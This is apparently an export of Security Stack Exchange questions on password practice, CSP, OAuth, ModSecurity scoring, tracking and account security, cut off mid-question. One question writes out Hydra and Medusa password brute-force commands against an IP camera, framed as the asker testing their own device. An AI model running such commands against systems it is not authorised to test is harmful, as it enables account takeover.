<p>So consider a server available to the Internet on port 443 (SSL) of a fixed IP address in the dialup range of a telecommunications provider only. When https'ed, it shows an <a href=""https://en.wikipedia.org/wiki/Internet_Information_Services#History"" rel=""nofollow"">IIS&nbsp;8</a> welcome page. The server can be reached via IP address only, no DNS entry (except the usual <code>ip-&lt;ip&gt;.customers.provider.com</code> entry that is set for EVERY IP address in the provider's range). The IP address is stored in the mail accounts of Windows Phone, iOS and Android devices, and entered from browsers with Google, <a href=""http://en.wikipedia.org/wiki/Bing"" rel=""nofollow"">Bing</a>, and Yahoo auto-search, thus technically known to Google, Apple, Yahoo and Microsoft, and possibly other third-party application vendors if these can access mail account settings from their applications.</p>

<p>Furthermore it is used for browsing the Internet and writing email, and is stored in many server logs, etc., etc., and especially on the sites where one has to log in, like Stack&nbsp;Exchange, you can see easily that it is a fixed IP address, since the IP address has always been tied to the same username for the last two years.</p>

<p>On that IIS server, OWA and <a href=""https://en.wikipedia.org/wiki/ActiveSync"" rel=""nofollow"">ActiveSync</a> are running. Both are required to access mail from everywhere. These are the applications that I would expect on an IIS server, and try first when I see an IIS welcome page.</p>

<p>Apart from doing Windows/Exchange updates regularly, using hard passwords, introducing all employees to the concepts of phishing and social engineering, and hoping that our email is not interesting enough to justify a fully fledged attack directed at us especially, could it make sense to ""secure"" the server by changing the page returned on a ""naked"" HTTPS request to a page indistinguishable (including all headers) from an ""It works!"" Apache page?</p>

<p>I could use some gooood arguments that a CEO, who came up with that idea in the first place, may understand.</p>

<p>EDIT: No, I don't need to get top management's support for security. The CEO seems to care for security already, or else he would not come up with such ideas for ""improvement"". I am not a security guy with certificates and all, just a concerned citizen, mainly developer, part-time server administrator. Our company does not have a real security guy; we are four people right now.</p>

<p>Since I do server administration part time, I was asked to change the server. But before I dig down deep for information on how to change the default headers in IIS, I would like to question the whole ""project""...</p>
","37853","","12","","2015-07-17 12:11:42","2015-07-17 12:11:42","Would making an IIS web server appear to be running Apache instead improve security?","<webserver><security-theater>","4","6","","","","CC BY-SA 3.0"
"230461","1","","","2020-04-24 12:58:49","","2","513","<p>Facebook has recently launched ""off facebook activity"" which lets you see all the activities shared by other apps/websites that you have interacted with. </p>

<p>But how did those apps and websites share that data with facebook, <strong>even when I didn't use facebook to log into them</strong>? In some cases, I have just surfed a website as an anonymous user, without signing up. Yet they were able to share activity data with Facebook. </p>

<p>Also please note the activities are NOT shared anonymously, but to my specific Facebook account.   <strong>How did the website get access to my FB account id even when I didnt use FB to login?</strong></p>

<hr>

<p>622 Apps have shared data to FB</p>

<p><a href=""https://i.stack.imgur.com/JrqFD.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/JrqFD.png"" alt=""enter image description here""></a></p>

<hr>

<p>Although I used FB to login only into 5 apps.</p>

<p><a href=""https://i.stack.imgur.com/0BIVi.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/0BIVi.png"" alt=""enter image description here""></a></p>

<hr>

<p>You can access off facebook activities here <a href=""https://www.facebook.com/off_facebook_activity/"" rel=""nofollow noreferrer"">https://www.facebook.com/off_facebook_activity/</a></p>

<p><strong>Update 1:</strong></p>

<p>I am concerned about other websites and apps tracking my activity. At least Facebook informed me.</p>

<p>For example:</p>

<pre><code>+---------------------------------------------+----------+---------------------------------------------------+
|                   Portal                    | Platform |                       Auth                        |
+---------------------------------------------+----------+---------------------------------------------------+
| Godzilla (a fake popular app like facebook) | Chrome   | Signed up and logged in                           |
| Godzilla on phone                           | Android  | Godzilla on chrome (logged in). No app installed. |
| XYZ.com                                     | Chrome   | Anonymous user                                    |
| XYZ's app                                   | Android  | Anonymous app user                                |
+---------------------------------------------+----------+---------------------------------------------------+
</code></pre>

<p>In which of these above cases can XYZ track me?</p>

<p><strong>Update 2:</strong></p>

<p>FB received several activity events from these 2 android apps</p>

<ul>
<li>Turbo VPN </li>
<li>Spotify</li>
</ul>

<p>Even though I dont have facebook app on my phone. How can I prevent this?</p>
","76389","","76389","","2020-04-24 15:46:35","2020-04-24 15:46:35","Off-Facebook activities received from apps and websites NEVER logged in via Facebook","<account-security><data-leakage><facebook><sensitive-data-exposure><third-party>","1","4","","","","CC BY-SA 4.0"
"230534","1","230535","","2020-04-25 18:43:29","","42","9662","<p>Let's say I use a 5 word password composed of 4 words plus the name of the website I'm accessing. For example for GitHub, it would be something like ""<a href=""https://xkcd.com/936/"" rel=""noreferrer"">correct battery horse staple</a> github"".</p>

<p>How is that different to using a password manager with ""correct battery horse staple github"" as the master password?</p>

<p>I also have a simpler password for accounts I don't care about or that I suspect might be vulnerable. I assume that everyone but the major companies (Google, Facebook, GitHub, Apple) store passwords in plain text.</p>

<p>Am I at risk by using this approach?</p>
","233165","","56961","","2020-04-27 18:02:38","2020-06-24 14:32:23","Are password managers more secure than a slightly different password for each website?","<passwords><password-management><account-security>","4","8","","","","CC BY-SA 4.0"
"230544","1","","","2020-04-25 23:48:57","","1","281","<p><strong>This will be a long one.</strong></p>

<p>Here's the thing: I want to build a privacy-preserving system where the user data is not even accessible to the database administrator. </p>

<p>Intuitively, I immediately thought of simply using AES to encrypt user data with their own password and hashing their username so that an attacker with access to my database would need to brute-force the password for the encrypted data to get the info and then brute-force the username to maybe get an idea of who the decrypted data is about.</p>

<p>This would be great but leads to the problem of forgotten passwords. If one forgets their password they could reset it by providing the correct username or recovery email (also hashed), but they could not get their data back. <a href=""https://protonmail.com/"" rel=""nofollow noreferrer"">ProtonMail</a>, for instance, claims your data is safe even from them, but you cannot recover your emails if you forget your password.</p>

<p>I then started looking at secret sharing and came across Shamir's secret. My question therefore is: Is the system I propose below <strong>worse</strong> than simply storing data in plaintext with obfuscated (hashed) usernames? </p>

<p>I understand that:</p>

<ol>
<li>Security does not come with complexity</li>
<li>This system will not be entirely flawless</li>
</ol>

<p>However, I just want to know if it is <strong>any better</strong> than a much simpler solution. Because as long as it is <strong>equally</strong> easy/hard for a hacker but <strong>harder</strong> for the database admin to gather any info from the data, it would be worth it for me.</p>

<p>It is ""complex"" because it is the only system my mind has currently come up with that allows for data encryption + <strong>somewhat simple</strong> recovery protecting data from hackers and admins. I would also happily take suggestions for other implementations.</p>

<p>So here we go.</p>

<p>The proposed system would use Shamir's secret to encrypt the user data with k=6 and n=11 so that 6/11 parts are needed to decrypt the data. User information would then be given a ""weight"" and utilized to store a proportional number of parts in an encrypted manner. Something like this:</p>

<p><strong>Weights</strong></p>

<ul>
<li>Username: 2</li>
<li>Password: 4 </li>
<li>Email: 2 </li>
<li>Security Question 1: 1 </li>
<li>Security Question 2: 1 </li>
<li>Name + Date of Birth: 1 </li>
</ul>

<p>Based on those weights, the following is done to the user's private data (pseudocode):</p>

<p><code>SHAMIR(user_data, k=6, n=11)</code></p>

<p>This will produce something like a uint8 array with length=11. Let's call that array <code>parts</code>.</p>

<p>The database would then use symmetric encryption (let's say AES) to store these parts as follows (only the resulting ciphertext is stored):</p>

<pre><code>{
  username: AES(key=username, message=parts[0:2])
  password: AES(key=password, message=parts[2:6])
  email: AES(key=email, message=parts[6:8])
  seq1: AES(key=answer, message=parts[8:9])
  seq2: AES(key=answer, message=parts[9:10])
  id: AES(key=name+dob, message=parts[10:11])
}

</code></pre>

<p>Login would then happen with the traditional username+password or email+password, such that the user will be authenticated/logged in if the data is decrypted correctly. Both combinations give access to enough parts (6) to decrypt the data. From the user perspective, it's all the same as everywhere else.</p>

<p>Then, user forgets their password. Well, now they need to find an alternative way to gather the 4 ""points"" provided by the password. So they would click ""Forgot Password"", and a form would pop up with all the possible fields to fill in. They must then fill enough to gather 4 more parts (in addition to username or email) in order to decrypt their data. For example:</p>

<p>username (2) + email (2) + seq1 (1) + namedob (1) = 6</p>

<p>(Email verification could also be implemented)</p>

<p>So now the user has 6/11. Server decrypts the data, user sets a new password, data is re-encrypted, and all the fields are updated with the new parts. By definition, a user who forgot their password will have accumulated a minimum of 10 out of 11 ""points"" after password reset is complete (The 6 points they provided + the 4 from the new password). Therefore, 1 point could be missing. Given that the user cannot provide that last point, they can be prompted to add a new security question, at which point all is back to normal.</p>

<p>So, in conclusion:</p>

<p>I know all parts of the secret being in the same place is not great, nor is it great to use AES with low-entropy secrets. </p>

<p>However, this should add <strong>some</strong> security, no? To get the data, an attacker would have to brute force at least a password and a username, or, to not brute-force the password, would have to brute-force quite a bit of other data. It isn't perfect by any means, but it's better for data privacy than the standard, no? What am I missing? Assuming it's implemented perfectly and it works as intended, is it possibly <strong>worse</strong> than how companies treat our data today? For most, a database breach means the data is already out there, only the password has to be brute-forced, right? </p>

<p>Lastly, could these objectives be achieved in any other way?</p>

<p>That's it. If you've read until now, thank you. Please go easy on me. </p>

<p>Cheers.</p>

<p>EDIT: I'm also thinking somewhat about UX here. The entropy of the data used to store the parts is definitely low, but giving users a higher-entropy ""random recovery code"" or something would be problematic from a UX perspective.</p>
","232153","","232153","","2020-04-26 01:22:31","2020-04-26 13:08:43","Find the flaw in my architecture: Shamir's Secret implementation for data encryption and recovery","<encryption><cryptography><privacy><account-security><secret-sharing>","1","5","","","","CC BY-SA 4.0"
"230551","1","230552","","2020-04-26 06:01:25","","1","103","<p>I would like to block the execution of any instance of CSS's <code>url()</code> function in CSS provided by my server. One promising method would be a CSP, but I'm not sure if this is possible using a CSP. Is it? And if not, what is the best way to accomplish this?</p>

<p>The reason is, there are some instances where users can modify CSS for other users, and I don't want them to be able to cause IP address leaks of users via the url() function.</p>
","224548","","37315","","2020-04-26 06:41:26","2020-04-26 06:52:17","Is there any way for a Content-Security-Policy to block a CSS function, (specifically the url() function)?","<content-security-policy><css>","1","7","","","","CC BY-SA 4.0"
"161394","1","161430","","2017-06-07 13:57:47","","1","863","<p>I have some evidence that our Godaddy domain account has been tampered with, by a former administrator with access to the account credentials.</p>
<p>To prove that the account was accessed, I need, at the very least, the timestamps of successful account login.</p>
<p>Godaddy refused to process my request for access logs to my own account, and responded</p>
<blockquote>
<p>Thank you for your email  We would be un able to provide logs with out a subpoena.  Please review the subpoena policy below.</p>
<p><a href=""https://my.godaddy.com/agreements/showdoc.aspx?pageid=CIVIL_SUBPOENA"" rel=""nofollow noreferrer"">https://my.godaddy.com/agreements/showdoc.aspx?pageid=CIVIL_SUBPOENA</a></p>
</blockquote>
<p>Wikipedia's ariticle on <a href=""https://en.wikipedia.org/wiki/Subpoena"" rel=""nofollow noreferrer"">subpoena</a> states that:</p>
<blockquote>
<p>Subpoenas are usually issued by the clerk of the court in the name of the judge presiding over the case</p>
</blockquote>
<p>This implies that there is a court case. But we have no court case yet, as I am still in the process of gathering information to support the case.</p>
<p>Questions:</p>
<ol>
<li><p>Is Godaddy entitled to refuse access to my own account information, except under legal compulsion?</p>
</li>
<li><p>Are there other ways of accessing this information?</p>
</li>
</ol>
","67627","","-1","","2020-06-16 09:49:05","2017-06-07 19:27:32","Can I access my own account logs at Godaddy without a subpoena?","<privacy><legal><account-security><domain-admin>","1","5","","2017-06-07 23:17:27","","CC BY-SA 3.0"
"20470","1","20504","","2012-09-21 05:39:48","","3","406","<h2><strong>Background:</strong></h2>

<p>I'm facing a situation with an online site I <em>must</em> (for the immediate time being) use for financial and HR-related matters that just sucks.  In every sense, but security in particular.  As much as I'd like to, I can't ditch this site immediately, but am definitely moving towards doing so ASAP (within a few months at the outside, I hope).  It is a very large portal in the US for accessing highly sensitive information over web - HR, financials, accounting and the like.
<br /><br /></p>

<h2><strong>Problem:</strong></h2>

<p>Their security <strong>Sucks</strong>.  A screenshot below, and note that the password is limit to 12 characters long.  <code>7</code> to <code>12</code> character password, no special character set, and subverted by security[-eliminating] questions that are mostly answerable with a few public records searches and/or some decent Google-Fu.  No checks to make sure the PC accessing it isn't infected with something nasty or anything like that, either, naturally.</p>

<p><br /></p>

<p><a href=""https://i.stack.imgur.com/RaZ2d.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/RaZ2d.png"" alt=""Embracing the suck""></a></p>

<p><br /></p>

<p>Again, this is a very large, US-based portal for HR and financial information.  If I wasn't so used to appalling security on the web, I'd be <strong>really</strong> pissed off, instead of just moderately angry and concerned.  So far as I can tell, there is also no alternate authentication method, such as two-factor auth, the ability to disable the security questions, or use a password that might actually hold out for more than a few minutes against an attacker who knows what he's doing.</p>

<p>I don't have visibility into their behind-the-scenes security (password hashing, salting, penetration testing, vulnerabilities, etc.), but based on what I've seen so far, I bet that pulling back the curtain would only be more cause for concern/alarm.</p>

<p><br /></p>

<h2>Question:</h2>

<ol>
<li>What <strong>can</strong> I do to best secure <em>myself</em> while I have to tolerate this abomination?</li>
<li>What <strong>should</strong> I do regarding the fact that all this sensitive information for so many people is being guarded by such poor security polices?  How should I notify, and what do I do when I get the canned <code>we take security seriously, eff off</code> response I know I'll get?

<ul>
<li>As theorized, pulling back the curtain would probably reveal some true horrors, but that seems like a bad idea.</li>
</ul></li>
</ol>

<p>I'm going to apply an answer to what I've done thus far to handle this from the standpoint of my personal security, but I'm not sure if I've done enough or missed anything I could be doing (given that I have to use this PoS) and would welcome your feedback.</p>

<p>I have no idea what to do regarding <strong>(2)</strong>.  My experience has been testing my own systems and fixing them, not stumbling across systems like this with worse security than my phone, backed by a massive corporation that will move slower than molasses uphill in winter (unless I do something stupid/out of line and they decide to sue me, in which case I bet they'll move really quick).</p>
","11622","","","","","2012-09-23 07:33:28","Is there any good (or less bad) way to handle a web portal or website with awful security?","<password-policy><security-theater>","5","1","","","","CC BY-SA 3.0"
"161524","1","","","2017-06-08 20:52:21","","4","505","<p>So I use the Three network in the UK to access the Internet on my phone. Recently, I noticed when going to mobile.three.co.uk  to access services which also includes information about my email address, home address, my PIN for accessing security settings, etc. (i.e. my personal and security information), that the website was not encrypted! This meant all my personal information and sensitive PIN number and other security information was being transmitted over the internet in the clear, which is very, very bad for security! </p>

<p>Am I overreacting or is this actually not very good security practice?</p>

<p>You can see screenshots I took:</p>

<p><a href=""https://www.dropbox.com/s/oxtxznakaf2scr3/1.PNG?dl=0"" rel=""nofollow noreferrer"">https://www.dropbox.com/s/oxtxznakaf2scr3/1.PNG?dl=0</a></p>

<p><a href=""https://www.dropbox.com/s/6nsp0k9l32y9m9a/2.PNG?dl=0"" rel=""nofollow noreferrer"">https://www.dropbox.com/s/6nsp0k9l32y9m9a/2.PNG?dl=0</a></p>

<p>Now, on that page in the picture above, I have to enter an access PIN, after which I can access pages displaying my home address, email address, international settings, security questions, etc. - but this page itself also uses HTTP not HTTPS! (However, any page to do with financial stuff like direct debit details is encrypted and shows up as HTTPS, but surely pages with personal information should also be encrypted?)</p>
","150455","","","","","2017-08-24 14:50:10","Is sending address, email address, etc. unencrypted over Internet - like Three UK does - bad security practice?","<encryption><tls><privacy><http><account-security>","2","2","","","","CC BY-SA 3.0"
"161536","1","","","2017-06-08 23:04:04","","0","3278","<p>For example, if I use Gmail, and use my Gmail account to send personal information, which I don't want others to see except the intended recipient, to a Hotmail account, both in the body as well as an attachment (PDF format), then who can intercept and read this information? Is it encrypted? I know the body and attachment are encrypted by TLS between my laptop and Google's servers, but what about when it is stored on Google's servers in my Gmail account? What about in transit between Gmail and Hotmail server? And all the routers and computers in between the two servers that form part of the many nodes of the Internet? What about once it is actually on the Hotmail server? What are Google and Microsoft's policies? What is standard industry policy?</p>

<p>Thank you!</p>
","150466","","","","","2017-06-09 01:38:01","Is sending personal information over email between different providers secure?","<privacy><email><data-leakage><account-security><email-attachments>","2","1","","","","CC BY-SA 3.0"
"161537","1","","","2017-06-08 23:45:30","","-1","1233","<p>This morning I woke up to the alarming fact that my mother's iPhone was put into Lost Mode and had a badly written notice asking to contact <em>help.apple.us@GMAIL.com</em>.</p>

<p>I knew it was some form of ransom, but oddly, I have not found anything like it online, just wanted to check if anyone else has heard of this?</p>
","117330","","83483","","2017-06-12 08:44:14","2017-07-06 05:02:58","Apple devices remotely locked/activation locked via Find my iPhone","<iphone><account-security>","3","3","","","","CC BY-SA 3.0"
"161650","1","","","2017-06-10 08:47:19","","2","6793","<p>For example, if I sign on to a bank website, and the bank gave me a cookie as an auth token.</p>

<p>Now instead of logging off, I simply close the web browser tab.</p>

<p>So now, if a hacker can somehow get my auth token, can he or she then fake that it is me by also faking the IP?</p>

<p>(I suppose the bank will restrict access to the IP I used with that auth token... but then isn't it true that even if the hacker cannot fake an IP address, he or she might be able to emit requests from my Mac or PC and therefore really emit the requests from my IP?)</p>
","61451","","","","","2017-06-10 23:29:43","Can hackers fake an IP address?","<ip><account-security>","1","4","","2017-06-13 15:14:31","","CC BY-SA 3.0"
"161734","1","","","2017-06-11 16:58:54","","5","1046","<p>I am trying to implement a system for third-party apps to access data that a user stores on a provider. We have a robust access control system, with separate read/write/etc. levels for each ""stream"" of data published by a user. Inside our website, these access levels are already enforced depending on which user is trying to do which action with another user's stream.</p>

<p>Now comes time to allow third-party apps to do the same, in an oAuth2-compatible way. We currently represent third-party apps inside the provider app database as regular users with a user id, canonical url, etc. So this user id would be the client_id of the app.</p>

<p>My question is, why does oAuth have tokens at all, which are essentially opaque strings that map to (user_id, client_id) records that have (scope, etc)?</p>

<p>Can't the app simply identify itself with the client_id as its api key and sign its requests with a symmetric secret, for server-to-server requests? These signed requests and responses can be relayed through a user agent if need be, if there is an additional requirement that a user be online when the request is granted.</p>

<p>The provider already stores the access records for the (user_id, client_id) so it knows whether to approve or deny a request from the client app. Why does the client app need to store and spit back extra tokens?</p>

<p>The only thing I have come up with so far is maybe this is to increase the security in case someone gets unauthorized access to the client app's symmetric secret. And this way the attack would be limited to whatever tokens they would be able to get (since the tokens are required as an additional credential). Seems that on the server side, if someone gets the symmetric secret, they probably also get the database credentials as well. So this isn't much of a plus.</p>

<p>Is there any other reason? Or was it just security theater?</p>
","45603","","","","","2017-06-11 19:33:36","Why does oAuth and oAuth 2 have access tokens at all?","<access-control><oauth><security-theater><oauth2>","1","0","","","","CC BY-SA 3.0"
"161748","1","","","2017-06-11 22:31:26","","0","163","<p>I have a problem which is 1 http service i'm developing will receive user sensitive data ( 3rd party API KEYS ) and i need to store the keys somewhere where i can retrieve them in clear text.</p>

<p>One of the major concerns here is if my http server gets hacked or one of the packages i'm using for my user facing application turns out to be exploitable a malicious user could get access to the machine and other people credentials.</p>

<p>In order to decrease my attack surface i'm creating a second machine called ""secrets"", this machine will be responsible for storing the actual keys, so if a malicious user gets access to my application machine he wouldn't get instant access to the list of keys.</p>

<p>The first idea that come to mind is to expose an HTTP API on the secrets machine, but then the malicious user would potentially find the address of my other machine therefore potentially being able to hack that machine as well.</p>

<p>In order to avoid exposing the other machine HTTP address to the first application i'm thinking about sending those keys over a pub/sub in redis, so the ""secrets"" machine would be subscribed to that channel, hopefully being ""undiscoverable"" by malicious users.</p>

<p>The question is: if the user finds the credential of my main application and the address of the redis server would then the user be able to discover who is subscribed to my pub/sub?</p>

<p>I'm planning to use redislab or heroku as a redis server.</p>
","77849","","77849","","2017-06-11 23:25:29","2017-06-11 23:25:29","Hiding computers behind redis pub/sub?","<key-management><attack-prevention><account-security>","0","2","","","","CC BY-SA 3.0"
"162021","1","162023","","2017-06-15 09:33:20","","101","31875","<p><a href=""https://i.stack.imgur.com/2leX7.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/2leX7.png"" alt=""enter image description here""></a></p>

<p>Suppose that someone stole my password, he/she can easily change it by confirming the old password.</p>

<p>So, I am curious that why do we need that step and what is the purpose of using old password confirmation? </p>
","26034","","188439","","2018-10-29 20:01:54","2020-08-16 16:57:59","What is the purpose of confirming old password to create a new password?","<passwords><password-policy><account-security>","6","10","","","","CC BY-SA 3.0"
"231030","1","","","2020-05-04 14:13:04","","1","698","<p>One of the tests I carried out was brute-forcing. I already knew what the username and password was for a factory reset IP Netcam but wanted to see how it would work in practice and if it even worked on IoT devices. </p>

<p>The commands I used for both tools are as follows:</p>

<pre><code>Medusa -h ""IP address"" -u ""default login"" -P Desktop/rockyou.txt -n 80 -M http

Hydra -l ""default login"" -P Desktop/rockyou.txt -e ns -f -V ""Ip address"" http-get
</code></pre>

<p>Hydra did seem to work fine on other devices and would attempt to go through the entire list. But for this TP-Link Netcam it seemed that both tools would just go partially through the lists and sometimes give multiple false positives within the few attempts made. </p>

<p>While I do not have access to these devices anymore to continue testing, I would at least like to know if it was something I entered wrong? Or if the device has something that could potentially stop this?</p>
","233854","","6253","","2020-05-04 15:30:11","2020-05-04 15:30:11","Why does THC Hydra and Medusa give false positives when used on TP-Link Netcam?","<brute-force><account-security><iot>","0","2","","","","CC BY-SA 4.0"
"231045","1","","","2020-05-04 18:23:14","","1","987","<p>I'm getting into OWASP CRS with ModSecurity and was investigating the way OWASP calculate the anomaly score in the REQUEST-901-INITIALIZATION.conf they set the following lines:</p>
<pre><code>setvar:'tx.anomaly_score=0',\
setvar:'tx.anomaly_score_pl1=0',\
setvar:'tx.anomaly_score_pl2=0',\
setvar:'tx.anomaly_score_pl3=0',\
setvar:'tx.anomaly_score_pl4=0',\
</code></pre>
<p>and in the REQUEST-949-BLOCKING-EVALUATION.conf they do the following:</p>
<pre><code>SecRule TX:PARANOIA_LEVEL &quot;@ge 1&quot; \
    &quot;id:949060,\
    phase:2,\
    pass,\
    t:none,\
    nolog,\
    setvar:'tx.anomaly_score=+%{tx.anomaly_score_pl1}'&quot;
enter preformatted text here
SecRule TX:PARANOIA_LEVEL &quot;@ge 2&quot; \
&quot;id:949061,\
phase:2,\
pass,\
t:none,\
nolog,\
setvar:'tx.anomaly_score=+%{tx.anomaly_score_pl2}'&quot;
</code></pre>
<p>Q1: Of course the paranoia level will be 1, 2, 3 or 4, so why do the &quot;@ge 1&quot;? which will be evaluated on every paranoia level?</p>
<p>Q2: When they do the setVar <code>&quot;setvar:'tx.anomaly_score=+%{tx.anomaly_score_pl2}&quot;</code> the equation will be <code>tx.anomaly_score=tx.anomaly_score+tx.anomaly_score_pl2</code>; is that right ? And how is this logically applicable if my request is being validated by multiple rules?</p>
<p>Q3: I would like to have a detailed example of how the OWASP CRS calculate the anomaly score and use it to deny the requests.</p>
","233874","","6253","","2022-09-25 10:21:24","2023-06-22 14:04:05","OWASP CRS Anomaly scoring, ModSecurity WAF","<waf><mod-security><anomaly-detection>","1","0","","","","CC BY-SA 4.0"
"162128","1","162144","","2017-06-16 17:00:45","","0","557","<p>Id like to understand the risks more in depth to explain it to someone who has a password policy that is not configured at all.</p>
","135414","","","","","2017-06-16 22:45:02","What are the risks of having a password policy on a domain that is not configured at all","<password-policy><account-security>","1","0","","","","CC BY-SA 3.0"
"162146","1","162148","","2017-06-16 23:07:19","","2","650","<p>I'm using BlueHost and have a few websites on my hosting. I decided to stop being lazy and start implementing some better security policies on my own part.</p>

<p>Since FTP isn't secure, I changed to SFTP. The odd thing is that BlueHost won't let me delete two of the FTP accounts on my BlueHost account. If these two accounts are never used, are they still a security risk?</p>
","145310","","","","","2017-06-17 15:35:43","Does an unused ftp account pose a security risk?","<webserver><account-security><ftp><sftp>","2","1","","","","CC BY-SA 3.0"
"231210","1","","","2020-05-06 23:23:51","","0","163","<p>I have a friendly, fun bot on Twitch. I haven't logged into its account for ages, purely communicating with the Twitch API and their IRC service.</p>

<p>The other day, they announced a new annouying ""Oauth"" requirement to access their API. As a result of this, I was forced to log in to the account. Of course, I had noted down the username and password, but after providing them, it didn't let me log in. Instead, it said that it has sent some kind of one-time code to the e-mail address associated with the account, which I've long since lost access to and which was a throwaway one to begin with.</p>

<p>As a result, I'm forever locked out from the account. I can never log in to it ever again, even though I have the password. I can't stress this enough:</p>

<p><strong><em>I have the password, but cannot log in to the account.</em></strong></p>

<p>Why do they do this? The Internet has become a broken mess where no site, no form, ever lets me actually use it anymore without harassing me. I'm made to sit and click on images for half an hour and then they still show an error in the end. Weird codes are sent to long-abandoned throwaway e-mail addresses. Fake error messages all the time.</p>

<p>How could I have ""guessed"" the password on the first try?</p>

<p>I've stopped even trying to register accounts or do anything because it never works anymore.</p>
","234064","","","","","2020-05-07 01:27:27","Why is having the username and password no longer enough to log in to an account anywhere?","<account-security>","2","1","","","","CC BY-SA 4.0"
"94929","1","","","2015-07-25 22:54:36","","13","95177","<p>Yesterday I found out that some major service provider (online rentals) that I use now requires proof of my identity if I want to continue and make a booking. I was offered 2 options:  </p>

<ol>
<li>Enter last 4 digits of my social security number and answer several questions.  </li>
<li>Scan some form of ID card (passport, driving license or other valid government ID)</li>
</ol>

<p>I decided to give up the last 4 digits of my SSN, but I was a little bit shocked of what happened next. On the next step they started asking me questions that I did not expect them to know the answers to: </p>

<ul>
<li>Which state did I live in 2005?  </li>
<li>Where is XXX street (on which I lived in 2013 &amp; 2014) located?  </li>
<li>Etc.</li>
</ul>

<p>Based on the questions and proposed answers it seemed like they already knew the answers to those questions. The reason why I think they already knew the answers is because I didn't live in the US in 2006-2012, and they seemed to know that I lived in the US in 2005 and then since 2013. </p>

<p>How did they know it? So it's so easy for a company to get this information? I don't feel comfortable!  </p>

<p>Now I have a few questions:  </p>

<ol>
<li><p>Why do some companies want the last 4 digits of my SSN?  </p></li>
<li><p>How do they supposedly use it? How do last 4 digits of SSN help check my identity? How does it work?</p></li>
<li><p>What can a hacker do if they somehow steal this information (my name, date of birth, address, last 4 digits of SSN)? How can this information be used against me?  </p></li>
<li><p>Do you think they could get those personal questions and answers just based on my name, address &amp; date of birth, or they could get that information somehow only after I entered last 4 digits of my SSN?  </p></li>
<li><p>What can a hacker do if they somehow steal a photo of my ID?</p></li>
<li><p>What do you think is safer: sending last 4 digits of SSN or a photo of ID card?</p></li>
</ol>
","81761","","98538","","2018-12-14 09:32:09","2019-08-13 12:18:25","Why do some companies ask last 4 digits of my SSN or a scan of my ID? What are my risks?","<privacy><identity><identification><social-security-number>","2","2","","","","CC BY-SA 4.0"
"94993","1","95011","","2015-07-26 17:58:41","","56","28057","<p>I have a Cordova app that transforms some images to base64. This violates CSP with this message:</p>
<blockquote>
<p>Refused to load the image
'data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encod…E%3C%2Fg%...%3C%2Fsvg%3E'
because it violates the following Content Security Policy directive:
&quot;default-src 'self'&quot;. Note that 'img-src' was not explicitly set, so
'default-src' is used as a fallback.</p>
</blockquote>
<p>According to <a href=""https://stackoverflow.com/a/18449556/1264804"">this answer</a>, I can simply add <code>data:</code> to my Content-Security-Policy meta, but I would very much like to know, if this is safe? <code>data:</code> does not specify origin and therefore I fear it's unsafe.</p>
","74787","","83853","","2021-11-19 09:42:16","2021-11-19 09:42:16","Is including the data scheme in your Content Security Policy safe?","<xss><content-security-policy>","2","0","","","","CC BY-SA 4.0"
"231264","1","","","2020-05-07 18:55:22","","2","733","<p>A CSP response header is set on the web worker JS file, but it is not enforced by the browser. The CSP is enforced in the Web worker only if the parent document's response header contains the CSP header. Is this expected?</p>

<ol>
<li><p>index.html</p>



<pre><code>&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Helle&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;script&gt;
    var worker = new Worker('/worker.js');

worker.addEventListener('message', function(e) {
  console.log('Worker said: ', e.data);
}, false);

worker.postMessage('getResponse');
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre></li>
<li><p>worker.js</p>



<pre><code>self.addEventListener('message', function(e) {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 &amp;&amp; this.status == 200) {

          self.postMessage(""done by worker"");
       // Typical action to be performed when the document is ready:
            console.log(xhttp.responseText);
    } else if (this.readyState == 4 &amp;&amp; this.status != 200) {
        console.log(xhttp.statusText);
        self.postMessage(""done by worker error"");
    }
};
xhttp.open(""GET"", ""https://jsonplaceholder.typicode.com/todos/1"", true);
xhttp.send();
}, false);
</code></pre></li>
</ol>

<p>Response Header <code>Content-Security-Policy: connect-src 'self';</code> is set on the worker.js file, but the CSP is still not enforced and the API call is successful in the network tab.</p>
","167522","","56961","","2020-05-15 13:56:00","2020-05-15 13:56:00","CSP is not enforced inside Web Worker","<content-security-policy>","1","0","","","","CC BY-SA 4.0"
"231411","1","","","2020-05-10 12:06:15","","1","289","<p>All the products supporting TOTP-based 2FA use one of the common authenticator apps such as Google Authenticator, Authy, etc. </p>

<p>I want to understand whether there are any security reasons behind why the implementations prefer to use the generic authenticator apps and not build the TOTP code-gen application themselves or even have it in the main app (the one that relies on TOTP for 2FA)? </p>

<p>I see a few concerns:</p>

<ol>
<li>Most of the TOTP use-cases are for login, so I understand the need for a different app to share the code, instead of having the code-generator within the parent app, which cannot be accessed - well - until one login. However, 2FA can have use-cases other than login</li>
<li>Time-sync on the local device can be hard, so one can rely on apps like Google Authenticator to implement it rather than implement it themselves. </li>
</ol>

<p>What are the other reasons? Are there any security concerns? I could not find any reference in the RFC specs. </p>
","234314","","","","","2020-10-07 14:04:55","In case of TOTP code generation, why do products prefer a generic authenticator apps, such as Google Authenticator?","<authentication><cryptography><account-security><one-time-password><totp>","2","0","","","","CC BY-SA 4.0"
"231565","1","","","2020-05-12 17:30:20","","0","196","<p>I'm new to the ionic framework and have some basics of it and currently I'm developing a private app for my family only that store some sensitive information in the localstorage. I used some crypto libraries to encrypt the whole data to prevent anyone reading it directly.</p>

<p>The app does not call any external API, links to any external network and website, and it does not connect to any server host since it is just for our own use only.</p>

<p>The question is, is there any vulnerability for anyone to attack my private app and get the data from localstorage? I've read some article saying that localstorage is either attack by physically getting the device or by XSS.</p>
","234482","","","","","2020-05-12 17:30:20","Ionic local storage store sensitive data for private app","<xss><account-security><sensitive-data-exposure><local-storage>","0","2","","","","CC BY-SA 4.0"
"162531","1","162536","","2017-06-22 13:20:52","","2","1119","<p>I recently read a W3C Working Draft about the Embedded Enforcement of a Content Security Policy (CSP).</p>

<blockquote>
